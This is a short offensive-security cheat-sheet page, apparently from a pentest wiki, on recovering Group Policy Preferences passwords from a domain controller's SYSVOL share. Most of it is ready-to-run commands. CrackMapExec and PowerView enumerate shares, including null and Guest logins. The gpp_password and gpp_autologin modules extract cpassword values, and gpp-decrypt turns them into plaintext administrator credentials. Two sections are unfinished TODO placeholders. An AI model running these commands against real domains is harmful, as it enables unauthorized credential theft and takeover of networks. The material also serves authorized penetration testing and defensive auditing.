# 📂 SYSVOL
---

#### 🤓 RTFM

A common - *and very bad* - way companies often use to widely change the built-in Administrator password over all domain computer is to use Group Policies.

Why bad? Because all Group Policies are stored as XML files in a network share named `SYSVOL` exposed on domain controllers and that are readable by all domain users!

Historically, passwords in Group Policies were encrypted through Group Policy Preferences (GPP). However, even though GPP-stored passwords are encrypted with AES-256, the [private key for the encryption has been posted on MSDN few years ago](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2).

#### 📝 Prerequisites

- Authenticated access to the target domain.
- Read access to `SYSVOL` share on a domain controller (it should be the case).

#### 🛠️ Do it!

> [!TODO]
> Put share discover in shares section and focus on gpp here.

First, you must look for shares that might contain Group Policies. You can first focus on `SYSVOL` folders that are mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on domain controllers by default.

```bash
# With PowerView
Find-DomainShare

# Manually with CME
cme smb $DC_IP -d $DOMAIN -u '' -p '' --shares
cme smb $DC_IP -d $DOMAIN -u 'Guest' -p '' --shares
cme smb $DC_IP -d $DOMAIN -u $USERNAME -p $PASSWORD --shares

# Connect to SYSVOL share
smbclient \\\\$DC_IP\\SYSVOL -U $DOMAIN/$USERNAME

# Automatically with CME
cme smb $DC_IP -d $DOMAIN -y $USERNAME -p $PASSWORD -M gpp_autologin
cme smb $DC_IP -d $DOMAIN -y $USERNAME -p $PASSWORD -M gpp_password
```

Once you identified relevant shares, try to find Group Policies (XML files). You must identify the `name` and `cpassword` properties in these files.

```bash
# From a domain joined computer
ls \\$DC_IP\sysvol\$DOMAIN\

# With smbclient
smbclient -L \\\\$DC_IP\\sysvol\\$DOMAIN -U $USERNAME
```

You can now decrypt the `cpassword` using [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt).

```bash
gpp-decrypt.py -c "$encrypted_password"
```

#### 🏆 What's next?

> [!TODO]
> Not implemented yet.